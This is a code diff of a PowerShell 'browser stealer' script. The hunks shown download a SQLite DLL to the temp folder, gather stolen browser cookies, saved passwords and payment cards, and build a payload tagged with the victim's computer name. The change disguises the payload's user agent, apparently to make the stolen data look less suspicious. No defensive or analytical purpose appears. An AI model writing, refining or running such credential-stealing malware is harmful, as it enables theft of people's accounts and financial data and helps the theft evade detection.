@@ -1,6 +1,5 @@
 # ============================================================
-# BROWSER STEALER — WORKING VERSION
-# Uses Invoke-WebRequest with -UseBasicParsing
+# BROWSER STEALER — FIXED (Browser shows as PowerShell)
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -25,7 +24,7 @@ Write-Log "============================================"
 Write-Log ""
 
 # ============================================================
-# DOWNLOAD SQLITE DLL USING Invoke-WebRequest
+# DOWNLOAD SQLITE DLL
 # ============================================================
 
 $dllPath = "$env:TEMP\System.Data.SQLite.dll"
@@ -389,7 +388,7 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# BUILD PAYLOAD — INCLUDES PC NAME
+# BUILD PAYLOAD — INCLUDES PC NAME + PowerShell Browser
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
@@ -405,7 +404,7 @@ $payload = @{
     }
     fingerprint = @{
         hostname = $pcName
-        userAgent = "PowerShell Payload"
+        userAgent = "PowerShell (Windows)"
         browser = "PowerShell"
         screen = "N/A"
     }
